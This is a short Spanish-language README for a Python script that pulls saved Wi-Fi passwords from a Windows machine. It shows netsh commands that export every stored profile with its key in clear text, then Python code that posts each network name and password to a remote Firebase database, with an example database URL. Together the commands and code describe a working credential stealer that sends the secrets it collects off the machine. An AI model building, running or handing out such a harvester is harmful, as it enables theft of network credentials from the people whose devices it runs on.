# Python-Wi-Fi
Obtener contraseñas Wi-Fi

Al archivo WiFi.py ejecuta los comandos en la consola de windows
```
netsh wlan show profile
netsh wlan show networks
netsh wlan export profile key=clear
```


Lo que deja ver las
#### redes wifi _guardadas en el dispositivo_ en el que se ejecuta el programa.
Después crea un archivo .xml por cada wifi, el programa encuentra en ese archivo las redes que tienen la contraseña visible y pasa toda esa informacion a una base de datos de firebase.

```python
db = firebase.FirebaseApplication('REALTIME DATABASE URL')
data = {"Wi-Fi": wifi_names[index],"Password": passwords[index]}
datos = db.post("/wifi's", data)
```
### Ejemplo de URL:
```python
db = firebase.FirebaseApplication('https://miproyecto-default-rtdb.firebaseio.com/')
```
